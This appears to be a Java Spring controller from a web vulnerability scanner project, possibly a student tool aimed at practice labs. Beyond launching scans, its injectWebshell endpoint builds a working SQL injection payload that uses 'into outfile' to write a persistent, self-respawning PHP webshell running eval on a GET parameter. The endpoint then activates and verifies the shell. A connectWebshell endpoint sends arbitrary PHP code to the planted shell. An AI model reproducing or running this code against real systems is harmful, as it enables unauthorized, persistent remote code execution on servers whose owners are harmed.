package edu.pku.controller;


import edu.pku.scannerCore.ScannerMainThread;
import org.apache.http.NameValuePair;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.utils.URIBuilder;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.net.URI;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;


@Controller
@RequestMapping("/")
public class HomeController {

    @RequestMapping(value = "/start", method = RequestMethod.POST)
    @ResponseBody
    public String Start(HttpSession session, HttpServletResponse response, String url,
                        String targetType, Integer maxThread,
                        @RequestParam(required = false) Boolean sql,
                        @RequestParam(required = false) Boolean xss,
                        @RequestParam(required = false) Boolean csrf,
                        @RequestParam(required = false) Boolean fileUpload,
                        @RequestParam(required = false) Boolean brute) {
        // 如果参数不合法,直接返回错误并重新回到主页
        if (url == null || targetType == null || maxThread == null) {
            return "<html><script>alert('参数错误!!');window.location.href='index.html';</script></html>";
        }

        // 初始化处理

        // 加载POC的列表
        Set<String> pocParam = new HashSet<>();
        if (sql != null) pocParam.add("sql");
        if (xss != null) pocParam.add("xss");
        if (csrf != null) pocParam.add("csrf");
        if (fileUpload != null) pocParam.add("fileUpload");
        if (brute != null) pocParam.add("brute");

        // 初始化漏洞扫描的主线程
        ScannerMainThread scannerMainThread = new ScannerMainThread(
                url, targetType, maxThread, pocParam
        );

        // 主线程开始扫描执行
        scannerMainThread.start();
        // 把对应的句柄保存到Session里面.
        session.setAttribute("process", scannerMainThread);

        // 重定向到结果页
        try {
            response.sendRedirect("result.html");
            return "";
        } catch (Exception e) {
            return e.toString();
        }
    }

    @RequestMapping(value = "/injectWebshell", method = RequestMethod.POST)
    @ResponseBody
    public String injectWebshell(HttpSession session,
                                 @RequestParam(required = true) String method,
                                 @RequestParam(required = true) String vulType,
                                 @RequestParam(required = true) String url,
                                 @RequestParam(required = true) String target) {
        // 不死马代码
        String phpCode = "<?php " +
                "ignore_user_abort(true);" +
                "@unlink(__FILE__);" +
                "$file = '.webshell.php';" +
                "$code = '<?php @eval($_GET[\"\"test\"\"]);?>';" +
                "while (1){" +
                "set_time_limit(0);" +
                "if(md5(file_get_contents($file))!==md5($code)) { " +
                "file_put_contents($file, $code);" +
                "} " +
                "usleep(5000);} " +
                "?>";
        // 开始构造sql注入的参数值
        // 闭合sql查询语句前半部分
        String payload = "some";
        switch (vulType) {
            case "sqli_str":
            case "sqli_blind_b":
            case "sqli_blind_t":
                payload += "'";
                break;
            case "sqli_search":
                payload += "%'";
                break;
            case "sqli_x":
                payload += "')";
                break;
            default:
                return "fail: 不支持的漏洞类型";
        }
        // 借助union select来写文件
        payload += " union select \"" + phpCode + "\", 2";
        if (vulType.equals("sqli_search")) {
            payload += ", 3";
        }
        payload += " into outfile \"" + target;
        if (target.endsWith("\\") || target.endsWith("/")) {
            payload += "webshell.php";
        } else {
            payload += "/webshell.php";
        }
        // 用注释符号闭合sql查询语句
        payload += "\"#";
        // 构造完成
        // 构造请求参数
        List<NameValuePair> params = new ArrayList<>();
        params.add(new BasicNameValuePair("name", payload));
        params.add(new BasicNameValuePair("submit", "%E6%9F%A5%E8%AF%A2"));
        // 开始发起请求
        CloseableHttpClient httpClient = HttpClientBuilder.create().build();
        CloseableHttpResponse response;
        try {
            if (method.equals("get")) {
                URIBuilder uriBuilder = new URIBuilder(url);
                uriBuilder.setParameters(params);
                URI uri = uriBuilder.build();
                HttpGet httpGet = new HttpGet(uri);
                response = httpClient.execute(httpGet);
                if (response.getStatusLine().getStatusCode() != 200) {
                    return "fail: 请求失败";
                }
            } else if (method.equals("post")) {
                HttpPost httpPost = new HttpPost(url);
                httpPost.setEntity(new UrlEncodedFormEntity(params));
                response = httpClient.execute(httpPost);
                if (response.getStatusLine().getStatusCode() != 200) {
                    return "fail: 请求失败";
                }
            } else {
                return "fail: 暂不支持的method类型";
            }
            // 激活不死马
            int pos = url.indexOf('/', 8);
            String urlWebshell = url.substring(0, pos) + "/webshell.php";
            URIBuilder uriBuilder = new URIBuilder(urlWebshell);
            URI uri = uriBuilder.build();
            HttpGet httpGet = new HttpGet(uri);
            RequestConfig conf = RequestConfig.custom()
                    .setConnectTimeout(5000)
                    .setSocketTimeout(5000)
                    .setConnectionRequestTimeout(6000).build();
            httpGet.setConfig(conf);
            try {
                httpClient.execute(httpGet);
            } catch (java.net.SocketTimeoutException e) {
            }
            // 尝试连接不死马生成的webshell
            // 通过该webshell运行php代码：echo hello;
            urlWebshell = url.substring(0, pos) + "/.webshell.php";
            uriBuilder = new URIBuilder(urlWebshell);
            uriBuilder.addParameter("test", "echo hello;");
            uri = uriBuilder.build();
            httpGet = new HttpGet(uri);
            httpGet.setConfig(conf);
            response = httpClient.execute(httpGet);
            String content = EntityUtils.toString(response.getEntity(), "UTF-8");
            if (content.equals("hello")) {
                return urlWebshell;
            } else {
                return "fail: 植入失败";
            }
        } catch (Exception e) {
            return "fail: " + e;
        }
    }

    @RequestMapping(value = "/connectWebshell", method = RequestMethod.POST)
    @ResponseBody
    public String connectWebshell(HttpSession session,
                                  @RequestParam(required = true) String urlWebshell,
                                  @RequestParam(required = true) String payload) {
        // 连接指定的webshell，并返回响应内容
        CloseableHttpClient httpClient = HttpClientBuilder.create().build();
        try {
            URIBuilder uriBuilder = new URIBuilder(urlWebshell);
            uriBuilder.addParameter("test", payload);
            URI uri = uriBuilder.build();
            HttpGet httpGet = new HttpGet(uri);
            CloseableHttpResponse response = httpClient.execute(httpGet);
            String content = EntityUtils.toString(response.getEntity(), "UTF-8");
            return content;
        } catch (Exception e) {
            return "fail: " + e;
        }
    }
}
